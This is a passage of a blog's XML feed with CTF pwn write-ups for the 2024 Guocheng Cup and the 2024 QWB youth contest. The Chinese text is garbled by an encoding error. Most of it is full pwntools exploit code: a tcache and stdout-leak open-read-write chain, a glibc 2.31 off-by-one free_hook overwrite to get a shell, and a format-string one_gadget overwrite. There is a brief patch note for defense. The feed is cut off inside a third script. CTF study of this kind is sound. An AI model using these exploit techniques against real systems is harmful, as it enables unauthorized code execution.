class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">stdout_attack=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,stdout_attack+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">stack=get_addr64()</span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(stack-<span class="number">288</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">flag=heap_base+<span class="number">0x1360</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#edit(0,p64(rdi)+b&#x27;\n&#x27;)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(rdx)+p64(<span class="number">0x100</span>)+p64(syscall)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">orw = p64(rdi) + p64(flag)  <span class="comment">#/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(rsi)+p64(stack+<span class="number">0x200</span>) <span class="comment">#è¯»å…¥flagçš„ä½ç½®</span></span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">orw += p64(rsi)+p64(stack+<span class="number">0x200</span>) <span class="comment">#è¯»å…¥flagçš„ä½ç½®</span></span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2024å›½åŸæ¯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024qwbé’å°‘å¹´</title>
    <link href="https://www.thir0th.xyz/posts/39ef564c.html"/>
    <id>https://www.thir0th.xyz/posts/39ef564c.html</id>
    <published>2025-04-20T06:38:35.000Z</published>
    <updated>2025-04-20T06:42:37.913Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>2024å¼ºç½‘é’å°‘å¹´</h1><h3 id="çº¿ä¸Š">çº¿ä¸Š</h3><h4 id="heap">heap</h4><p>2.31çš„of by oneï¼Œadd free,show freeèœå•å‡½æ•°</p><p>addå’Œeditéƒ½æœ‰æœ«å°¾ç½®é›¶ï¼Œshowç›´æ¥è¢«æˆªæ–­ï¼Œæ²¡åŠæ³•æ³„éœ²å‡ºlibc</p><p>è¿™é¢˜çš„éš¾ç‚¹ä¹Ÿå°±æ˜¯æ³„éœ²å‡ºlibc</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>å…ˆfree7ä¸ªå †å—ï¼Œå‰6ä¸ªè¿›å…¥tcachebinï¼Œç¬¬7ä¸ªä¼šè¿›å…¥unsortdbinï¼Œä¹‹åå †å—åˆ‡å‰²ï¼Œå°†ä¸€ä¸ªå¤§å †å—åˆ†ä¸ºå°å †å—ï¼Œå¹¶ä¸”ç•™ä¸€éƒ¨åˆ†å †å—åœ¨unsortdbinä¸­ï¼Œè¿™æ ·æ¯ä¸ªå°å †å—ä¸­éƒ½æœ‰libcåœ°å€ï¼Œä½†ä¼šè¢«\x00æˆªæ–­ï¼Œä¿®æ”¹å°å †å—çš„sizeï¼Œå°†ç”³è¯·çš„å°å †å—åˆå¹¶ï¼Œå¹¶ä¸”å¯ä»¥ä¿®æ”¹åœ¨unsotrdbinä¸­çš„prsize,size</p><p>è¿™æ ·å¯ä»¥showå‡ºlibcåœ°å€</p><p>ä¹‹åmallocä¼šæŠ¥é”™ï¼Œæå‰å¸ƒç½®å¥½å †å—æ‰“of by one attackæ”»å‡»free_hookï¼Œè·å–shell</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1733840641114-5aca0de2-5c19-45e9-bb64-107c04b8a20e.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Enter the size of your story (in hex, between 0x28 and 0xb0):&quot;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(size))</span><br><span class="line">rl(<span class="string">&quot;characters): &quot;</span>)</span><br><span class="line">sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Choose an option: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):<span class="comment">#0-9</span></span><br><span class="line">add(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#0-6</span></span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p8(<span class="number">0x71</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=get_addr64()-<span class="number">2018145</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">edit(1,b&#x27;\x00&#x27;*(0x28)+p64(0x31)+b&#x27;\x00&#x27;*(0x28)+p64(0x31))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#edit(1,b&#x27;/bin/sh\x00&#x27;+p64(0)*4+p64(0x31)+p64(free_hook))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x48</span>)+p8(<span class="number">0xa1</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x51</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,p64(system))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="çº¿ä¸‹awdp">çº¿ä¸‹awdp</h3><h4 id="smart-home">smart_home</h4><h5 id="æ”»å‡»ï¼š">æ”»å‡»ï¼š</h5><p>æ— é™æ¬¡fmtï¼Œå­—èŠ‚é™åˆ¶ä¸º0x10</p><p>éæ ˆä¸Šæ‰“æŒ‡é’ˆè·³è½¬ï¼Œæ”»å‡»rbp+8ï¼Œæ”¹ä¸ºone_gadetï¼Œ3é€€å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;51%9$p%11$p&#x27;</span></span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">147587</span></span><br><span class="line">bug()</span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">240</span>-<span class="number">2</span></span><br><span class="line">li(<span class="built_in">hex</span>(stack+<span class="number">2</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span>-<span class="number">2</span></span><br><span class="line">li(<span class="built_in">hex</span>(one_gadget+<span class="number">2</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(one_gadget&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>))</span><br><span class="line">pause()</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode() +<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">li(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay3=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay3)</span><br><span class="line">stack=stack+<span class="number">2</span></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay4=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay4)</span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line">pay5=<span class="string">b&#x27;51%&#x27;</span>+<span class="built_in">str</span>(one_gadget&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>-<span class="number">2</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>    </span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(pay5)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Enter your choice:&quot;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id="é˜²å¾¡ï¼š">é˜²å¾¡ï¼š</h5><p>æ‰¾åˆ°fmtæ¼æ´çš„æ±‡ç¼–ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733838936488-143b2d22-5e9b-4ca5-8514-77f34e0961da.png" alt="">å°†call _printfæ”¹ä¸ºcall _putsï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733839189511-ac68f169-3b69-4569-a421-536f654eeb7f.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733839238746-a9ba6112-b362-4e15-bfe3-321784a08d2a.png" alt=""></p><h4 id="youth-memory-album">youth_memory_album</h4><h5 id="æ”»å‡»ï¼š-2">æ”»å‡»ï¼š</h5><p>èœ€é“å±±mini_hookçš„å¼±åŒ–ç‰ˆï¼ŒåŸºæœ¬åŒæ ·çš„æ‰“æ³•ï¼Œæ”»å‡»tcachebinçš„æŒ‡é’ˆåŒº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 